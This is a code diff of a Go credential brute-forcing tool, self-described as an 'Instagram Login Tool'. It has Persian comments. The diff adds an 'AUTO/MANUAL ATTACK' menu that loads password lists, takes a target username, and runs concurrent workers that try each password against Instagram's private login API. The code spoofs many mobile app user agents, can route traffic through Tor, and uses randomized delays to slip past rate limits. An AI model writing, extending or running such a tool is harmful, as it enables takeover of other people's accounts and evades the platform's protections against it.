@@ -1,4 +1,5 @@
 package main
+
 import (
 	"bufio"
 	"compress/gzip"
@@ -17,6 +18,7 @@ import (
 	"time"
 	"golang.org/x/net/proxy"
 )
+
 const (
 	API_URL            = "https://i.instagram.com/api/v1/"
 	TIMEOUT            = 20 * time.Second
@@ -37,18 +39,18 @@ var userAgents = []string{
 	"Instagram 318.0.7.22.109 Android (29/10; 320dpi; 720x1384; samsung; SM-G960W; starqltecs; qcom; en_CA; 690234910)",
 	"Instagram 365.0.0.40.94 Android (34/14; 450dpi; 1080x2301; samsung; SM-A146U; a14xm; mt6833; en_US; 690234900; IABMV/1)",
 	"Instagram 365.0.0.40.94 Android (34/14; 420dpi; 1080x2115; samsung; SM-G990W; r9q; qcom; en_CA; 690234877)",
-        "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743",
-        "Instagram 141.0.0.17.118 Android (29/10; 450dpi; 1080x2192; samsung; SM-G986U; y2q; qcom; en_US; 213368022)",
+	"Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743",
+	"Instagram 141.0.0.17.118 Android (29/10; 450dpi; 1080x2192; samsung; SM-G986U; y2q; qcom; en_US; 213368022)",
 	"Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; samsung; SM-A515F; a51; exynos9611; en_US; 329000029)",
 	"Instagram 328.0.0.13.119 Android (31/12; 480dpi; 1080x2400; samsung; SM-A715F; a71; qcom; en_US; 328000013)",
-        "Instagram 330.0.0.23.108 Android (31/12; 480dpi; 1080x2400; samsung; SM-A525F; a52; qcom; en_US; 330002310)",
-        "Instagram 330.0.0.23.108 Android (30/11; 420dpi; 1080x2340; Xiaomi; M2007J20CG; gauguin; qcom; en_US; 330002310)",
-        "Instagram 327.0.0.20.123 Android (30/11; 420dpi; 1080x2400; realme; RMX3371; RMX3371; qcom; en_US; 327000020)",
-        "Instagram 372.0.0.48.60 Android (34/14; 450dpi; 1080x2222; samsung; SM-S928N; e3q; qcom; vi_VN; 709818009)",
-        "Instagram 352.1.0.41.100 Android (31/12; 420dpi; 1080x2047; samsung; SM-G975F; beyond2; exynos9820; in_ID; 650753877)",
-        "Instagram 350.1.0.46.93 Android (31/12; 480dpi; 1080x2051; samsung; SM-N976N; d2x; exynos9825; ko_KR; 645441462)",
-        "Instagram 357.1.0.52.100 Android (34/14; 450dpi; 1080x2127; samsung; SM-S926N; e2s; s5e9945; ko_KR; 662944209)",
-        "Instagram 349.3.0.42.104 Android (34/14; 420dpi; 1080x2133; samsung; SM-S911N; dm1q; qcom; ko_KR; 643237792)",
+	"Instagram 330.0.0.23.108 Android (31/12; 480dpi; 1080x2400; samsung; SM-A525F; a52; qcom; en_US; 330002310)",
+	"Instagram 330.0.0.23.108 Android (30/11; 420dpi; 1080x2340; Xiaomi; M2007J20CG; gauguin; qcom; en_US; 330002310)",
+	"Instagram 327.0.0.20.123 Android (30/11; 420dpi; 1080x2400; realme; RMX3371; RMX3371; qcom; en_US; 327000020)",
+	"Instagram 372.0.0.48.60 Android (34/14; 450dpi; 1080x2222; samsung; SM-S928N; e3q; qcom; vi_VN; 709818009)",
+	"Instagram 352.1.0.41.100 Android (31/12; 420dpi; 1080x2047; samsung; SM-G975F; beyond2; exynos9820; in_ID; 650753877)",
+	"Instagram 350.1.0.46.93 Android (31/12; 480dpi; 1080x2051; samsung; SM-N976N; d2x; exynos9825; ko_KR; 645441462)",
+	"Instagram 357.1.0.52.100 Android (34/14; 450dpi; 1080x2127; samsung; SM-S926N; e2s; s5e9945; ko_KR; 662944209)",
+	"Instagram 349.3.0.42.104 Android (34/14; 420dpi; 1080x2133; samsung; SM-S911N; dm1q; qcom; ko_KR; 643237792)",
 	//iOS
 	"Instagram 235.1.0.24.107 (iPhone12,1; iOS 18_1_1; en_US; en-US; scale=2.21; 828x1792; 370368062) NW/3",
 	"Instagram 279.0.0.17.112 (iPhone12,5; iOS 18_1_1; en_US; en-US; scale=3.00; 1242x2688; 465757305)",
@@ -76,7 +78,27 @@ func main() {
 	setupLogger()
 	fmt.Println(" ***Instagram Login Tool (v2.0)*** ")
 	fmt.Printf("coded by: %s\n\n", CURRENT_USER)
-	fmt.Println("Checking Public IPs...\n")
+
+	// نمایش منو و انتخاب حالت
+	mode := selectMode()
+	var passwords []string
+
+	if mode == 1 {
+		// AUTO ATTACK
+		passwords = loadPasswordsAuto()
+	} else {
+		// MANUAL ATTACK
+		passwords = loadPasswordsManual()
+	}
+
+	if len(passwords) == 0 {
+		fmt.Println("No passwords found!")
+		return
+	}
+
+	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
+
+	fmt.Println("\nChecking Public IPs...\n")
 
 	ipDirect, errDirect := getPublicIP(&http.Client{Timeout: 10 * time.Second})
 	ipTor, torOK := getTorIP()
@@ -106,26 +128,43 @@ func main() {
 		fmt.Println("TOR is not active , direct connection is active\n")
 	}
 
-// نمایش منو و انتخاب حالت
-	mode := selectMode()
-	var passwords []string
-
-	if mode == 1 {
-		// AUTO ATTACK
-		passwords = loadPasswordsAuto()
-	} else {
-		// MANUAL ATTACK
-		passwords = loadPasswordsManual()
-	}
-
-	if len(passwords) == 0 {
-		fmt.Println("No passwords found!")
+	username := getUsername()
+	if username == "" {
+		fmt.Println("Username is empty!")
 		return
 	}
 
-	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
-	// ... بقیه کد مثل قبل
-}
+	fmt.Println("\nStarting login attempts...\n")
+	found := make(chan LoginResult, 1)
+	progress := make(chan int, len(passwords))
+	var wg sync.WaitGroup
+
+	jobs := make(chan string, len(passwords))
+	for i := 0; i < WORKER_COUNT; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for password := range jobs {
+				res := tryLogin(username, password, useTor)
+				progress <- 1
+				if res.Success {
+					select {
+					case found <- res:
+					default:
+					}
+					return
+				}
+				time.Sleep(randomDuration(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
+			}
+		}()
+	}
+
+	go func() {
+		for _, password := range passwords {
+			jobs <- password
+		}
+		close(jobs)
+	}()
 
 	go showProgressBar(len(passwords), progress)
 
@@ -145,6 +184,73 @@ func main() {
 			Message:  "Not found",
 		})
 	}
+}
+
+// تابع منو
+func selectMode() int {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Println("Choose attack mode:")
+	fmt.Println("[1] AUTO ATTACK (use default passwords)")
+	fmt.Println("[2] MANUAL ATTACK (use your own password file)")
+	fmt.Print("Enter your choice (1 or 2): ")
+	for {
+		input, _ := reader.ReadString('\n')
+		input = strings.TrimSpace(input)
+		if input == "1" || input == "2" {
+			if input == "1" {
+				return 1
+			} else {
+				return 2
+			}
+		}
+		fmt.Print("Invalid choice. Please enter 1 or 2: ")
+	}
+}
+
+// بارگذاری پسورد خود ابزار
+func loadPasswordsAuto() []string {
+	return loadPasswordsFromFiles("password.txt", "password.json")
+}
+
+// بارگذاری پسورد از فایل کاربر
+func loadPasswordsManual() []string {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("Enter your password file path: ")
+	filePath, _ := reader.ReadString('\n')
+	filePath = strings.TrimSpace(filePath)
+	return loadPasswordsFromFiles(filePath, "")
+}
+
+// تابع عمومی بارگذاری پسورد
+func loadPasswordsFromFiles(txtFile string, jsonFile string) []string {
+	var passwords []string
+	if txtFile != "" {
+		file, err := os.Open(txtFile)
+		if err == nil {
+			defer file.Close()
+			scanner := bufio.NewScanner(file)
+			for scanner.Scan() {
+				pass := strings.TrimSpace(scanner.Text())
+				if pass != "" {
+					passwords = append(passwords, pass)
+				}
+			}
+		} else {
+			log.Printf("Error opening password file: %v", err)
+		}
+	}
+	if jsonFile != "" {
+		fileJSON, errj := os.Open(jsonFile)
+		if errj == nil {
+			defer fileJSON.Close()
+			var jsonPasswords []string
+			decoder := json.NewDecoder(fileJSON)
+			if err := decoder.Decode(&jsonPasswords); err == nil {
+				passwords = append(passwords, jsonPasswords...)
+			}
+		}
+	}
+	return passwords
 }
 
 func getPublicIP(client *http.Client) (string, error) {
@@ -190,69 +296,6 @@ func getUsername() string {
 	fmt.Print("Enter Instagram username: ")
 	username, _ := reader.ReadString('\n')
 	return trim(username)
-}
-////new adddddddddddddddddd
-func selectMode() int {
-	reader := bufio.NewReader(os.Stdin)
-	fmt.Println("Choose attack mode:")
-	fmt.Println("[1] AUTO ATTACK (use default passwords)")
-	fmt.Println("[2] MANUAL ATTACK (use your own password file)")
-	fmt.Print("Enter your choice (1 or 2): ")
-	for {
-		input, _ := reader.ReadString('\n')
-		input = strings.TrimSpace(input)
-		if input == "1" || input == "2" {
-			if input == "1" {
-				return 1
-			} else {
-				return 2
-			}
-		}
-		fmt.Print("Invalid choice. Please enter 1 or 2: ")
-	}
-} 
-
-func loadPasswordsAuto() []string {
-	return loadPasswordsFromFiles("password.txt", "password.json")
-}
-
-// بارگذاری پسورد از فایل کاربر
-func loadPasswordsManual() []string {
-	reader := bufio.NewReader(os.Stdin)
-	fmt.Print("Enter your password file path: ")
-	filePath, _ := reader.ReadString('\n')
-	filePath = strings.TrimSpace(filePath)
-	return loadPasswordsFromFiles(filePath, "")
-}
-
-// تابع عمومی بارگذاری پسورد
-func loadPasswordsFromFiles(txtFile string, jsonFile string) []string {
-	var passwords []string
-	if txtFile != "" {
-		file, err := os.Open(txtFile)
-		if err == nil {
-			defer file.Close()
-			scanner := bufio.NewScanner(file)
-			for scanner.Scan() {
-				pass := strings.TrimSpace(scanner.Text())
-				if pass != "" {
-					passwords = append(passwords, pass)
-				}
-			}
-		}
-	}
-	if jsonFile != "" {
-		fileJSON, errj := os.Open(jsonFile)
-		if errj == nil {
-			defer fileJSON.Close()
-			var jsonPasswords []string
-			decoder := json.NewDecoder(fileJSON)
-			if err := decoder.Decode(&jsonPasswords); err == nil {
-				passwords = append(passwords, jsonPasswords...)
-			}
-		}
-	}
-	return passwords
 }
 
 func showProgressBar(total int, progress <-chan int) {
@@ -321,7 +364,7 @@ func buildHeaders(dev deviceInfo) map[string]string {
 		"Content-Type":              "application/x-www-form-urlencoded; charset=UTF-8",
 		"Accept":                    "*/*",
 		"Accept-Language":           "en-US",
-		"Accept-Encoding":           "gzip, deflate, br", 
+		"Accept-Encoding":           "gzip, deflate, br",
 		"X-IG-Capabilities":         "3brTvw==",
 		"X-IG-Connection-Type":      "WIFI",
 		"X-IG-App-ID":               IG_APP_ID,
@@ -449,36 +492,6 @@ func tryLogin(username, password string, useTor bool) LoginResult {
 		msg = "invalid username"
 	}
 	return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: msg}
-}
-
-func loadPasswords() []string {
-	var passwords []string
-
-	file, err := os.Open("password.txt")
-	if err == nil {
-		defer file.Close()
-		scanner := bufio.NewScanner(file)
-		for scanner.Scan() {
-			pass := strings.TrimSpace(scanner.Text())
-			if pass != "" {
-				passwords = append(passwords, pass)
-			}
-		}
-	} else {
-		log.Printf("Error opening password file: %v", err)
-	}
-
-	fileJSON, errj := os.Open("password.json")
-	if errj == nil {
-		defer fileJSON.Close()
-		var jsonPasswords []string
-		decoder := json.NewDecoder(fileJSON)
-		if err := decoder.Decode(&jsonPasswords); err == nil {
-			passwords = append(passwords, jsonPasswords...)
-		}
-	}
-
-	return passwords
 }
 
 func saveResultJSON(result LoginResult) {
